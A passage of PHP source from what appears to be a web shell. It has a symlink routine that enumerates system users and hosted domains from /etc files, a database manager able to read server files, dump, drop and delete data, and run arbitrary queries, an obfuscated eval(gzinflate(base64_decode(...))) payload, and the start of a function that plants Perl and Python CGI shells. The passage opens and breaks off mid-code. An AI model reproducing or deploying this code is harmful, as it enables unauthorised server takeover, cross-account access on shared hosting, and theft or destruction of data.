                            $expl = explode(":", $user);
                            if ((int) $expl[2] < 500) {
                                continue;
                            }
                            $users[$expl[0]] = $expl[5];
                        }
                        $site_domains = @scandir("/etc/virtual/");
                        if (!$site_domains) {
                            $site_domains = riotEx("ls /etc/virtual/");
                            $site_domains = explode("\n", $site_domains);
                            if (!$site_domains) {
                                $site_domains = _riot_file("/etc/named.conf");
                                if ($site_domains) {
                                    $is_named = true;
                                }
                            }
                        }
                        foreach ($site_domains as $line) {
                            if ($is_named) {
                                if (@strstr($line, "zone")) {
                                    preg_match_all('#zone "(.*)"#', $line, $data);
                                    $domain = $data[1][0];
                                    if (strlen($domain > 2) && !empty($domain)) {
                                        $domains[] = $domain;
                                    }
                                }
                            } else {
                                $domains[] = $line;
                            }
                        }
                        $x = 1;
                        foreach ($users as $user => $home) {
                            foreach ($domains as $domain) {
                                $user_len = strlen($user) - 1;
                                $sub_domain = str_replace(["-", "."], "", $domain);
                                $five_user = substr($user, 0, $user_len);
                                $five_domain = substr($sub_domain, 0, $user_len);
                                if ($five_user == $five_domain) {
                                    if ($is_direct) {
                                        $cwd = str_replace("{user}", $user, $makepwd);
                                    } else {
                                        $expl = explode("}/", $makepwd);
                                        $cwd = $home . "/" . $expl[1];
                                    }
                                    $html .= str_replace(["{count}", "{user}", "{url}", "{cwd}"], [$x++, $user, $domain, $cwd], $template);
                                } else {
                                    $uknowns[$user] = $home;
                                }
                            }
                        }
                        $uknowns = array_unique($uknowns);
                        foreach ($uknowns as $user => $home) {
                            if ($is_direct) {
                                $cwd = str_replace("{user}", $user, $makepwd);
                            } else {
                                $expl = explode("}/", $makepwd);
                                $cwd = $home . "/" . $expl[1];
                            }
                            $html .= str_replace(["{count}", "{user}", "{url}", "{cwd}"], [$x++, $user, "[?????]", $cwd], $template);
                        }
                        echo $html;
                    }
                }
                echo "</table>";
                $cant_symlink = false;
            }
        } else {
            echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";
            $cant_symlink = false;
        }
        if ($cant_symlink) {
            echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#FFFFFF">Error...</font></b><br>';
        }
        echo "</center></table>";
    }
    echo "</div>";
    riotfooter();
}
function riotsql()
{
    class DbClass
    {
        public $type;
        public $link;
        public $res;
        public $mysqli_connect_error = false;
        public $mysqli_connect_error_msg = "";
        function __construct($type)
        {
            $this->type = $type;
        }
        function connect($host, $user, $pass, $dbname)
        {
            switch ($this->type) {
                case "mysql":
                    if ($this->link = @mysqli_connect($host, $user, $pass, $dbname)) {
                        return true;
                    } else {
                        $this->mysqli_connect_error = true;
                        $this->mysqli_connect_error_msg = mysqli_connect_error();
                        return false;
                    }
                    break;
                case "pgsql":
                    $host = explode(":", $host);
                    if (!$host[1]) {
                        $host[1] = 5432;
                    }
                    if ($this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname")) {
                        return true;
                    }
                    break;
            }
            return false;
        }
        function selectdb($db)
        {
            switch ($this->type) {
                case "mysql":
                    if (@mysqli_select_db($db)) {
                        return true;
                    }
                    break;
            }
            return false;
        }
        function query($str)
        {
            switch ($this->type) {
                case "mysql":
                    return $this->res = @mysqli_query($this->link, $str);
                    break;
                case "pgsql":
                    return $this->res = @pg_query($this->link, $str);
                    break;
            }
            return false;
        }
        function fetch()
        {
            $res = func_num_args() ? func_get_arg(0) : $this->res;
            switch ($this->type) {
                case "mysql":
                    return @mysqli_fetch_assoc($res);
                    break;
                case "pgsql":
                    return @pg_fetch_assoc($res);
                    break;
            }
            return false;
        }
        function listDbs()
        {
            switch ($this->type) {
                case "mysql":
                    return $this->query("SHOW databases");
                    break;
                case "pgsql":
                    return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
                    break;
            }
            return false;
        }
        function listTables()
        {
            switch ($this->type) {
                case "mysql":
                    return $this->res = $this->query("SHOW TABLES");
                    break;
                case "pgsql":
                    return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
                    break;
            }
            return false;
        }
        function error()
        {
            switch ($this->type) {
                case "mysql":
                    return @mysqli_error($this->link);
                    break;
                case "pgsql":
                    return @pg_last_error();
                    break;
            }
            return false;
        }
        function setCharset($str)
        {
            switch ($this->type) {
                case "mysql":
                    if (function_exists("mysql_set_charset")) {
                        return @mysqli_set_charset($this->link, $str);
                    } else {
                        $this->query("SET CHARSET " . $str);
                    }
                    break;
                case "pgsql":
                    return @pg_set_client_encoding($this->link, $str);
                    break;
            }
            return false;
        }
        function loadFile($str)
        {
            switch ($this->type) {
                case "mysql":
                    return $this->fetch($this->query("SELECT LOAD_FILE('" . addslashes($str) . "') as file"));
                    break;
                case "pgsql":
                    $this->query("CREATE TABLE riotexec(file text);COPY riotexec FROM '" . addslashes($str) . "';select file from riotexec;");
                    $r = [];
                    while ($i = $this->fetch()) {
                        $r[] = $i["file"];
                    }
                    $this->query("drop table riotexec");
                    return ["file" => implode("\n", $r)];
                    break;
            }
            return false;
        }
    }
    $db = new DbClass($_POST["type"]);
    riothead();
    $form_visibility = "table";
    if (isset($_POST["sql_host"])) {
        $connection_db = $db->connect($_POST["sql_host"], $_POST["sql_login"], $_POST["sql_pass"], $_POST["sql_base"]);
        if ($connection_db && !empty($_POST["sql_base"])) {
            $form_visibility = "none";
        }
    }
    $database_list = [];
    echo "
<div class='header' style='min-height:300px;'>" .
        ($form_visibility != "none"
            ? "<center><div class='txtfont_header'>| Sql Manager |</div><p>" .
                getConfigHtml("all") .
                "</p></center><div style='text-align:center;margin-bottom: 10px;'><button class='connection-his-btn db-opt-id' onclick='riotShowConnectionHistory(this);' mode='on'>Connection History</button><div class='connection_history_holder'></div></div>"
            : "") .
        "
<div class='sf' class='db-opt-id'><table style='margin: 0 auto;" .
        ($form_visibility == "none" ? "display:none;" : "") .
        "' cellpadding='2' cellspacing='0'><tr>
<td><div class=\"txtfont\">TYPE</div></td><td><div class=\"txtfont\">HOST</div></td><td><div class=\"txtfont\">DB USER</div></td><td><div class=\"txtfont\">DB PASS</div></td><td><div class=\"txtfont\">DB NAME</div></td><td></td></tr><tr>
<td><select name='type'><option value='mysql' selected>mysql</option></select></td>
<td><input type='text' name='sql_host' id='db_host' value='" .
        (empty($_POST["sql_host"]) ? "localhost" : htmlspecialchars($_POST["sql_host"])) .
        "'></td>
<td><input type='text' name='sql_login' id='db_user' value='" .
        (empty($_POST["sql_login"]) ? "" : htmlspecialchars($_POST["sql_login"])) .
        "'></td>
<td><input type='text' name='sql_pass' id='db_pw' value='" .
        (empty($_POST["sql_pass"]) ? "" : htmlspecialchars($_POST["sql_pass"])) .
        "'></td><td>";
    $tmp = "<input type='text' name='sql_base' id='db_name' value='" . (empty($_POST["sql_base"]) ? "" : htmlspecialchars($_POST["sql_base"])) . "'>";
    if (isset($_POST["sql_host"])) {
        if ($connection_db) {
            $db->setCharset("utf8");
            $db->listDbs();
            echo "<select name=sql_base><option value=''></option>";
            while ($item = $db->fetch()) {
                list($key, $value) = each($item);
                $database_list[] = $value;
                echo '<option value="' . $value . '" ' . ($value == $_POST["sql_base"] ? "selected" : "") . ">" . $value . "</option>";
            }
            echo "</select>";
        } else {
            echo $tmp;
        }
    } else {
        echo $tmp;
    }
    $curr_mysql_id = $_POST["current_mysql_id"];
    echo "</td>
<td><button onclick='fs(this);return false;' class='db-opt-id db-connect-btn'>Connect</button></td>
<td><input type='checkbox' name='sql_count' value='on'" .
        (empty($_POST["sql_count"]) ? "" : " checked") .
        "> <div class=\"txtfont\">count the number of rows</div></td>
</tr>
</table>";
    if ($db->mysqli_connect_error) {
        echo '<div style="text-align: center;font-size: 17px;margin-top: 18px;">' . $db->mysqli_connect_error_msg . "</div>";
    }
    if (!empty($curr_mysql_id)) {
        $sql_title_db = "";
        if (!empty($_POST["sql_base"])) {
            $sql_title_db = "d.querySelector('#tab_" . $curr_mysql_id . " span').innerHTML='" . addslashes($_POST["sql_base"]) . "';";
        }
        echo "<script>mysql_cache['" .
            $curr_mysql_id .
            "']['host']='" .
            addslashes($_POST["sql_host"]) .
            "';mysql_cache['" .
            $curr_mysql_id .
            "']['user']='" .
            addslashes($_POST["sql_login"]) .
            "';mysql_cache['" .
            $curr_mysql_id .
            "']['pass']='" .
            addslashes($_POST["sql_pass"]) .
            "';mysql_cache['" .
            $curr_mysql_id .
            "']['db']='" .
            addslashes($_POST["sql_base"]) .
            "';mysql_cache['" .
            $curr_mysql_id .
            "']['charset']='" .
            addslashes($_POST["charset"]) .
            "';mysql_cache['" .
            $curr_mysql_id .
            "']['type']='" .
            addslashes($_POST["type"]) .
            "';mysql_cache['" .
            $curr_mysql_id .
            "']['count']='" .
            addslashes($_POST["sql_count"]) .
            "';" .
            $sql_title_db .
            "riotConnectionHistoryUpdate();</script>";
    }
    if (isset($db) && $db->link) {
        if (!empty($_POST["sql_base"])) {
            echo "<div class='mysql-main'><div mode='block' onclick='riotMysqlTablePanelCtl(this);' class='tables-panel-ctl db-opt-id'>&#x3C;&#x3C;</div><div class='mysql-tables'><div><input placeholder=\"Filter Table\" style='padding: 0;margin-left: 11px;text-align:center;' type='text' name='filter_all'><button class='db-opt-id' onclick='riotMysqlFilterAllTable(this);return false;'>Search</button></div><div class='block'><a sql_count='" .
                (empty($_POST["sql_count"]) ? "false" : "true") .
                "' mode='closed' onclick='riotMysqlFilterAllTable(this,true);' class='expander parent-expander db-opt-id' href='javascript:void(0);'><img src='https://dev.artikelspiner.id/icon/b_plus.png' title='Expand/Collapse All DataBases' alt='Expand/Collapse All DataBases'></a></div><ul style='margin-top: 28px;'>";
            foreach ($database_list as $db_name) {
                echo '<li><div class="block"><i></i><b></b><a sql_count="' .
                    (empty($_POST["sql_count"]) ? "false" : "true") .
                    '" db_target="' .
                    $db_name .
                    '" onclick="riotMysqlExpander(this);" class="expander cls-' .
                    $db_name .
                    '-expander db-opt-id" href="javascript:void(0);"><img src="https://dev.artikelspiner.id/icon/' .
                    ($db_name == $_POST["sql_base"] ? "b_minus.png" : "b_plus.png") .
                    '" title="Expand/Collapse" alt="Expand/Collapse"></a></div><span class="db_name">' .
                    $db_name .
                    '</span><div class="clearfloat"></div><div db_name="' .
                    $db_name .
                    '" mode="' .
                    ($db_name == $_POST["sql_base"] ? "loaded" : "no") .
                    '" class="list_container cls-' .
                    $db_name .
                    '"><div>';
                if ($db_name == $_POST["sql_base"]) {
                    $db->selectdb($_POST["sql_base"]);
                    $tbls_res = $db->listTables();
                    echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-' .
                        $db_name .
                        '" placeholder="Filter Table" onkeyup="riotMysqlFilterTable(this);" name="filter"></div></li>';
                    while ($item = $db->fetch($tbls_res)) {
                        list($key, $value) = each($item);
                        if (!empty($_POST["sql_count"])) {
                            $n = $db->fetch($db->query("SELECT COUNT(*) as n FROM `" . $value . "`"));
                        }
                        $value = htmlspecialchars($value);
                        echo "<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='" .
                            $value .
                            "'>&nbsp;<a class='db-opt-id' db_target='" .
                            $db_name .
                            "' href='javascript:void(0);' onclick=\"riotLoadTableData(this,'" .
                            $value .
                            "')\"><span class='mysql_tables' style='font-weight:unset;'>" .
                            $value .
                            "</span></a>" .
                            (empty($_POST["sql_count"]) ? "&nbsp;" : " <small><span style='font-weight:unset;' class='mysql_table_count'>({$n["n"]})</span></small>") .
                            "</div></li>";
                    }
                    echo '</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="riotMysqlTablesEvil(this);" class="db-opt-id" target=".cls-' .
                        $db_name .
                        '" type="checkbox" class="db-opt-id"><select onchange="riotMysqlTablesDumpDrop(this);" class="db-opt-id" target=".cls-' .
                        $db_name .
                        '" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="riotMysqlTablesDumpDropBtn(this);return false;" class="db-opt-id" db_target="' .
                        $db_name .
                        '" target=".cls-' .
                        $db_name .
                        '" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>';
                }
                echo "</div></li>";
            }
            echo "</ul></div><div class='mysql-query-results'><div class='mysql-query-result-tabs'><div class='db-opt-id mysql-query-selected-tab' target='.mysql-query-result-content' onclick='riotMysqlTabCtl(this);'>Result</div><div class='db-opt-id' target='.mysql-query-form' onclick='riotMysqlTabCtl(this);'>Query</div><div class='db-opt-id' target='.mysql-search-area' onclick='riotMysqlTabCtl(this);'>Search</div><div class='db-opt-id' target='.mysql-structure' onclick='riotMysqlTabCtl(this);'>Structure</div><div class='db-opt-id' target='.mysql-insert-row' onclick='riotMysqlTabCtl(this);'>Insert</div><div style='display:none;' class='db-opt-id' target='.mysql-edit-row' onclick='riotMysqlTabCtl(this);'>Edit</div></div><div class='mysql-query-content mysql-insert-row mysql-hide-content'></div><div class='mysql-query-content mysql-edit-row mysql-hide-content'></div><div class='mysql-query-content mysql-search-area mysql-hide-content'></div><div class='mysql-query-content mysql-structure mysql-hide-content'></div><div class='mysql-query-content mysql-query-form mysql-hide-content'><div style='margin-bottom: 5px;'><span>Query:</span></div><textarea name='query' style='width:90%;height:100px'></textarea><p><div style='float:left;margin-left: 30px;'><input class='button db-opt-id' db_target='" .
                $_POST["sql_base"] .
                "' onclick='riotMysqlQuery(this);return false;' type='submit' value=' '></div></p></div><div class='mysql-query-content mysql-query-result-content'><div class='mysql-query-result-header'><div style='margin-bottom: 10px;' class='mysql-query-reporter'></div><div class='mysql-query-pager'></div></div><div class='mysql-query-table'></div></div></form></td></tr>";
        }
        echo "</table></div>";
        echo "</div>";
    } else {
        echo htmlspecialchars($db->error());
    }
    echo "</div>";
    riotfooter();
}
eval(htmlspecialchars_decode(gzinflate(base64_decode($R10TXER))));
function riotSql_manager_api()
{
    $db = $_POST["riot1"];
    $type = $_POST["riot2"];
    $sql_count = $_POST["riot3"] == "true" ? true : false;
    $db = @json_decode($db, true);
    $conn = @mysqli_connect($db["host"], $db["user"], $db["pass"], $db["db"]);
    @mysqli_set_charset($conn, "utf8");
    if ($conn) {
        if ($type == "load_all_tables") {
            $tables = [];
            $q_tables = @mysqli_query($conn, "SELECT `table_schema`, `table_name` FROM `information_schema`.`tables` WHERE `table_schema` IN ('" . implode("','", $db["databases"]) . "');");
            $count = 0;
            while ($row = @mysqli_fetch_assoc($q_tables)) {
                if ($sql_count) {
                    $count_q = @mysqli_query($conn, "SELECT COUNT(*) FROM `" . $row["table_schema"] . "`.`" . $row["table_name"] . "`");
                    if ($count_q) {
                        $count = @mysqli_fetch_row($count_q);
                        $count = $count[0];
                    }
                }
                $tables[$row["table_schema"]][] = [
                    "name" => $row["table_name"],
                    "count" => (int) $count,
                ];
            }
            foreach ($db["databases"] as $db) {
                if (!isset($tables[$db])) {
                    $tables[$db] = null;
                }
            }
            echo @json_encode($tables);
        } elseif ($type == "dump_drop") {
            if ($db["mode"] == "drop") {
                foreach ($db["tables"] as $table) {
                    @mysqli_query($conn, "DROP TABLE `" . $table . "`;");
                }
                $tables = [];
                $q_tables = @mysqli_query($conn, "SHOW TABLES;");
                $count = 0;
                while ($row = @mysqli_fetch_array($q_tables)) {
                    if ($sql_count) {
                        $count_q = @mysqli_query($conn, "SELECT COUNT(*) FROM `" . $row[0] . "`");
                        if ($count_q) {
                            $count = @mysqli_fetch_row($count_q);
                            $count = $count[0];
                        }
                    }
                    $tables[] = ["name" => $row[0], "count" => (int) $count];
                }
                echo @json_encode($tables);
            } else {
                if (strlen(riotEx("mysqldump")) > 0) {
                    riotEx("mysqldump --single-transaction --host=\"" . $db["host"] . "\" --user=\"" . $db["user"] . "\" --password=\"" . $db["pass"] . "\" " . $db["db"] . " " . implode(" ", $db["tables"]) . "  > " . $db["dump_file"]);
                } else {
                    $fp = @fopen($db["dump_file"], "w");
                    foreach ($db["tables"] as $table) {
                        $res = @mysqli_query($conn, "SHOW CREATE TABLE `" . $table . "`");
                        $create = @mysqli_fetch_array($res);
                        $sql = "DROP TABLE IF EXISTS `" . $table . "`;\n" . $create[1] . ";\n";
                        if ($fp) {
                            fwrite($fp, $sql);
                        } else {
                            echo $sql;
                        }
                        $tbl_data = @mysqli_query($conn, "SELECT * FROM `" . $table . "`");
                        $head = true;
                        while ($item = @mysqli_fetch_assoc($tbl_data)) {
                            $columns = [];
                            foreach ($item as $k => $v) {
                                if ($v == null) {
                                    $item[$k] = "''";
                                } elseif (is_numeric($v)) {
                                    $item[$k] = $v;
                                } else {
                                    $item[$k] = "'" . @mysqli_real_escape_string($conn, $v) . "'";
                                }
                                $columns[] = "`" . $k . "`";
                            }
                            if ($head) {
                                $sql = "INSERT INTO `" . $table . "` (" . implode(", ", $columns) . ") VALUES \n\t(" . implode(", ", $item) . ")";
                                $head = false;
                            } else {
                                $sql = "\n\t,(" . implode(", ", $item) . ")";
                            }
                            if ($fp) {
                                fwrite($fp, $sql);
                            } else {
                                echo $sql;
                            }
                        }
                        if (!$head) {
                            if ($fp) {
                                fwrite($fp, ";\n\n");
                            } else {
                                echo ";\n\n";
                            }
                        }
                    }
                }
                echo @json_encode([
                    "status" => true,
                    "file" => $db["dump_file"],
                ]);
            }
        } elseif ($type == "load_tables") {
            $tables = [];
            $q_tables = @mysqli_query($conn, "SHOW TABLES;");
            $count = 0;
            while ($row = @mysqli_fetch_array($q_tables)) {
                if ($sql_count) {
                    $count_q = @mysqli_query($conn, "SELECT COUNT(*) FROM `" . $row[0] . "`");
                    if ($count_q) {
                        $count = @mysqli_fetch_row($count_q);
                        $count = $count[0];
                    }
                }
                $tables[] = ["name" => $row[0], "count" => (int) $count];
            }
            echo @json_encode($tables);
        } elseif ($type == "alter") {
            $db["alter"]["type"] = strtolower($db["alter"]["type"]);
            $inputs = $db["alter"]["type"] . "(" . $db["alter"]["input"] . ")";
            $text_input = ["longtext", "text", "mediumtext", "tinytext"];
            if (in_array($db["alter"]["type"], $text_input)) {
                $inputs = $db["alter"]["type"];
            }
            @mysqli_query($conn, "ALTER TABLE `" . $db["table"] . "` MODIFY COLUMN `" . $db["column"] . "` " . $inputs);
            $error = @mysqli_error($conn);
            if ($error) {
                echo $error;
            } else {
                echo "ok";
            }
        } elseif ($type == "edit" || $type == "delete" || $type == "delete_all") {
            if ($type == "edit") {
                $q = @mysqli_query($conn, "SELECT * FROM `" . $db["db"] . "`.`" . $db["table"] . "` WHERE `" . $db["col_key"] . "` = '" . addslashes($db["key"]) . "' LIMIT 0,1");
                $row = @mysqli_fetch_assoc($q);
                if ($row) {
                    $columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE, DATA_TYPE as type FROM information_schema.columns WHERE `TABLE_SCHEMA` = '" . $db["db"] . "' AND `TABLE_NAME` = '" . $db["table"] . "'");
                    $columns = [];
                    $edit_data = [];
                    while ($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)) {
                        $input = ["col_type" => $row2["COLUMN_TYPE"]];
                        $row2["type"] = strtolower($row2["type"]);
                        switch ($row2["type"]) {
                            case "longtext":
                            case "text":
                            case "mediumtext":
                            case "tinytext":
                                $input["tag"] = "textarea";
                                break;
                            case "int":
                            case "smallint":
                            case "bigint":
                            case "tinyint":
                            case "mediumint":
                                $input["tag"] = "input";
                                $input["type"] = "number";
                                break;
                            default:
                                $input["tag"] = "input";
                                $input["type"] = "text";
                        }
                        $columns[$row2["name"]] = $input;
                    }
                    foreach ($row as $key => $v) {
                        $edit_data[] = [
                            "col" => $key,
                            "value" => htmlspecialchars($v, ENT_QUOTES, "UTF-8"),
                            "type" => $columns[$key],
                        ];
                    }
                    echo @json_encode($edit_data);
                }
            } else {
                if ($type == "delete_all") {
                    $rows = implode("', '", $db["rows"]);
                } else {
                    $rows = addslashes($db["key"]);
                }
                $query = "DELETE FROM `" . $db["db"] . "`.`" . $db["table"] . "` WHERE `" . $db["col_key"] . "` IN ('" . $rows . "')";
                @mysqli_query($conn, $query);
                $error = @mysqli_error($conn);
                if ($error) {
                    $status = false;
                } else {
                    $status = true;
                }
                echo @json_encode([
                    "status" => $status,
                    "error" => $error,
                    "query" => $query,
                ]);
            }
        } elseif ($type == "update") {
            $query = "UPDATE `" . $db["db"] . "`.`" . $db["table"] . "` SET ";
            foreach ($db["data"] as $col => $val) {
                $query .= "`" . $col . "` = '" . mysqli_real_escape_string($conn, $val) . "',";
            }
            $query = substr($query, 0, -1);
            $query .= "WHERE `" . $db["col_key"] . "` = '" . $db["key"] . "'";
            $res = @mysqli_query($conn, $query);
            echo @json_encode([
                "status" => $res,
                "error" => @mysqli_error($conn),
            ]);
        } elseif ($type == "insert") {
            $query = "INSERT INTO `" . $db["db"] . "`.`" . $db["table"] . "` ";
            foreach ($db["data"] as $col => $val) {
                $cols .= $col . ",";
                $vals .= "'" . mysqli_real_escape_string($conn, $val) . "',";
            }
            $cols = substr($cols, 0, -1);
            $vals = substr($vals, 0, -1);
            $query = $query . "(" . $cols . ")" . "VALUES(" . $vals . ")";
            $res = @mysqli_query($conn, $query);
            echo @json_encode([
                "status" => $res,
                "error" => @mysqli_error($conn),
            ]);
        } else {
            $pages = 0;
            $title = false;
            $query = "";
            $tbl_content = '<table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
            $line = 0;
            $tables = [];
            $columns = [];
            if ($type == "load_data") {
                $query = "SELECT * FROM `" . $db["db"] . "`.`" . $db["table"] . "` LIMIT 0,30";
                $tbl_count_q = @mysqli_query($conn, "SELECT COUNT(*) FROM `" . $db["db"] . "`.`" . $db["table"] . "`");
                $tbl_count = @mysqli_fetch_row($tbl_count_q);
                $columns_query = @mysqli_query(
                    $conn,
                    "SELECT COLUMN_NAME as name, COLUMN_TYPE as type, COLLATION_NAME as collation, DATA_TYPE as data_type, CHARACTER_MAXIMUM_LENGTH as type_value FROM information_schema.columns WHERE `TABLE_SCHEMA` = '" .
                        $db["db"] .
                        "' AND `TABLE_NAME` = '" .
                        $db["table"] .
                        "'"
                );
                while ($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)) {
                    $columns[] = $row2;
                }
                if ($tbl_count[0] > 30) {
                    $pages = ceil($tbl_count[0] / 30);
                }
            } elseif ($type == "query") {
                $query = $db["query"];
            } elseif ($type == "page") {
                $db["page"] = (int) $db["page"] - 1;
                $query = "SELECT * FROM `" . $db["db"] . "`.`" . $db["table"] . "` LIMIT " . $db["page"] * 30 . ",30";
            } elseif ($type == "search") {
                $search = "";
                $search_noval = ["= ''", "!= ''", "IS NULL", "IS NOT NULL"];
                foreach ($db["search"] as $col => $val) {
                    $search_noval_r = in_array($val["opt"], $search_noval);
                    if (empty($val["value"]) && !$search_noval_r) {
                        continue;
                    }
                    if (strstr($val["opt"], "...") || $search_noval_r) {
                        $val["opt"] = str_replace("...", $val["value"], $val["opt"]);
                        $search .= $col . " " . $val["opt"] . " AND ";
                    } else {
                        $search .= $col . " " . $val["opt"] . " '" . addslashes($val["value"]) . "' AND ";
                    }
                }
                $search .= "1=1";
                $query = "SELECT * FROM `" . $db["db"] . "`.`" . $db["table"] . "` WHERE " . $search;
            }
            $q_tables = @mysqli_query($conn, $query);
            if (!$q_tables) {
                echo @json_encode([
                    "status" => false,
                    "error" => @mysqli_error($conn),
                    "query" => $query,
                ]);
                return false;
            }
            $col_key = @mysqli_query($conn, "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '" . @addslashes($db["db"]) . "' AND TABLE_NAME = '" . @addslashes($db["table"]) . "' AND COLUMN_KEY = 'PRI'");
            if ($col_key) {
                $col_key = @mysqli_fetch_row($col_key);
                $col_key = $col_key[0];
                if (!empty($col_key)) {
                    $tbl_content =
                        '<div style="margin-bottom:5px;margin-top:5px;"><button col_key="' .
                        $col_key .
                        '" tbl_name="' .
                        $db["table"] .
                        '" db_id="' .
                        $db["db_id"] .
                        '" 	db_target="' .
                        $db["db"] .
                        '" onclick="riotMysqlDeleteAllSelectedrows(this);return false;">Delete Selected Rows</button></div><table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
                }
            } else {
                $col_key = false;
            }
            while ($item = @mysqli_fetch_assoc($q_tables)) {
                if (!$title) {
                    $tbl_content .= '<tr style="background-color:#305b8e;">';
                    if ($col_key) {
                        $tbl_content .=
                            '<th style="width: 55px;text-align:center;"><input db_id="' .
                            $db["db_id"] .
                            '" onchange="riotMysqlTblSelectAll(this);" type="checkbox"></th><th style="width: 55px;text-align:center;">Edit</th><th style="width: 55px;text-align:center;">Delete</th>';
                    }
                    foreach ($item as $key => $value) {
                        $tbl_content .= "<th>" . $key . "</th>";
                    }
                    reset($item);
                    $title = true;
                    $tbl_content .= "</tr><tr>";
                }

                if ($col_key) {
                    $cacheMsg =
                        '<td style="text-align:center;"><input row_id="' .
                        $line .
                        '" type="checkbox" name="tbl_rows_checkbox[]" value="' .
                        $item[$col_key] .
                        '"></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="' .
                        $db["db_id"] .
                        '" db_target="' .
                        $db["db"] .
                        '" tbl_name="' .
                        $db["table"] .
                        '" col_key="' .
                        $col_key .
                        '" key="' .
                        $item[$col_key] .
                        '" onclick="riotMysqlEditRow(this, \'edit\');" style="color:#0acaa6;">Edit</a></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="' .
                        $db["db_id"] .
                        '" db_target="' .
                        $db["db"] .
                        '" tbl_name="' .
                        $db["table"] .
                        '" col_key="' .
                        $col_key .
                        '" key="' .
                        $item[$col_key] .
                        '" row_id="' .
                        $line .
                        '" onclick="riotMysqlEditRow(this, \'delete\');" style="color:#ff1e1e;">Delete</a></td>';
                }
                $tbl_content .= '<tr class="tbl_row tbl_row_l' . $line . '">' . $cacheMsg;
                $line++;
                foreach ($item as $key => $value) {
                    if ($value == null) {
                        $tbl_content .= "<td><i>null</i></td>";
                    } else {
                        $tbl_content .= "<td>" . nl2br(htmlspecialchars($value)) . "</td>";
                    }
                }
                $tbl_content .= "</tr>";
            }
            $tbl_content .= "</table>";
            if (!$title) {
                $tbl_content = "<div style='padding:5px;border:1px dashed;margin:10px;'>Table is empty...</div>";
            }
            echo @json_encode([
                "status" => true,
                "table" => $tbl_content,
                "columns" => $columns,
                "pages" => $pages,
                "query" => $query,
            ]);
        }
        @mysqli_close($conn);
    }
}
function riotcgishell()
{
    riothead();
    $div = "";
    riotCreateParentFolder();
    @chdir($GLOBALS["home_cwd"] . "/" . __SYS_CONFIG_FOLDER__);
    if (!in_array($_POST["riot1"], ["perl", "py"])) {
        $div = "</div>";
        echo '<div class=header><center><p><div class="txtfont_header">| CGI Shell |</div></p><h3><a class="rejectme" href="javascript:void(0)" onclick="runcgi(\'perl\')">| Perl | </a><a class="rejectme" href="javascript:void(0)" onclick="runcgi(\'py\');">| Python | </a>';
    }
    if (isset($_POST["riot1"]) && in_array($_POST["riot1"], ["perl", "py"])) {
        @mkdir("cgiriot", 0755);
        @chdir("cgiriot");
        riotcgihtaccess("cgi");
        $name = $_POST["riot1"] . ".riot";
        $perl =
            "#!/usr/bin/perl   -I/usr/local/bandmin" .
            "\n" .
